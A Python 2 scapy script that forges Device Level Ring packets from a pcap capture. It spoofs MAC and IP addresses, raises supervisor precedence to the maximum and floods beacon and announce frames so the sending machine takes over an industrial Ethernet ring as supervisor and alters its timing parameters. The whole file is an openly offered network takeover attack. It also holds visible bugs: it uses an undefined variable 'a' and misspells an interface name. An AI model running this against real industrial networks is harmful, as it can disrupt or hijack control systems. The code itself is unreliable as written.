#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 Yuan Bowei, bernardy@sfu.ca
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
'''This module fabricates DLR packets from reading sample packets from a pcap file,
then modifies some fields of the file and send it out from two Ethernet ports, so that
the machine plugged into the DLR ring can be taken as a ring supervisor. In particular,
the supervisor precedence is increased to the highest value (255) so that your machine
could take control over the ring. To confirm that your machine is accepted as a new ring
supervisor, the DLR parameters (Beacon Interval and Beacon Timeout) are also modified,
the result is that original ring supervisors would change their DLR parameters in accordance'''
__author__ = 'bernardyuan'
from scapy import all
from scapy.layers import  l2
import DLR
# read the pcap file
pcap = all.rdpcap('DLR/dlr.pcap')
import time
# specify the interfaces to sniff and send packets, it should differ on different machines
interface0 = 'en4'
interface1 = 'en5'
#build beacon frame and announce frame
beaconpacket = l2.Ether(**a[0][l2.Ether].fields)/l2.Dot1Q(**a[0][l2.Dot1Q].fields)/DLR.DLR(**a[0][DLR.DLR].fields)
announcepacket = l2.Ether(**a[1937][l2.Ether].fields)/l2.Dot1Q(**a[1937][l2.Dot1Q].fields)/DLR.DLR(**a[1937][DLR.DLR].fields)

# set explicit value to 1, as mentioned in document
beaconpacket.explicit = 1
beaconpacket.payload.explicit = 1
announcepacket.explicit=1
announcepacket.payload.explicit=1

#fake the source MAC address in Ethernet header
beaconpacket.fields["src"] = "00:1d:9c:c8:03:e8"
announcepacket.fields["src"] = "00:1d:9c:c8:03:e8"

#fake the source IP address in DLR
beaconpacket.payload.payload.fields["Source_IP"] = '192.168.0.19'
announcepacket.payload.payload.fields["Source_IP"] = '192.168.0.19'

#increase the priority to highest
beaconpacket.payload.payload.fields["Supervisor_Precedence"] = 255
#sequence ID counts from 0
beaconpacket.payload.payload.fields["Sequence_ID"] = 0
announcepacket.payload.payload.fields["Sequence_ID"] = 0

#set DLR parameters
beaconpacket.payload.payload.fields["Beacon_Timeout"] = 1960
beaconpacket.payload.payload.fields["Beacon_Interval"] = 400

#set 2 timers
beaconstart = time.clock()
announcestart = time.clock()
#initial ring state set to FAULT_STATE
announcepacket.payload.payload.fields["Ring_State"] = 2
beaconpacket.payload.payload.fields["Ring_State"] = 2
#init from Fault state
for i in range(10) :
    all.sendp(str(announcepacket),iface=interface0)
    # beacon packets are sent from both two interfaces
    all.sendp(str(beaconpacket),iface=interface0)
    all.sendp(str(beaconpacket),iface=interface1)

#now transistion to NORMAL state
announcepacket.payload.payload.fields["Ring_State"] = 1
beaconpacket.payload.payload.fields["Ring_State"] = 1
# continuously send out the frames
while True:
    if time.clock() - beaconstart > 400*1.0/1000000:
        beaconstart = time.clock()
        # sequence ID increment by 1
        beaconpacket.payload.payload.fields["Sequence_ID"] += 1
        all.sendp(str(beaconpacket),iface=interace0)
        all.sendp(str(beaconpacket),iface=interface1)
    if time.clock() - announcestart > 1:
        announcestart = time.clock()
        announcepacket.payload.payload.fields["Sequence_ID"] += 1
        all.sendp(str(announcepacket),iface=interface0)

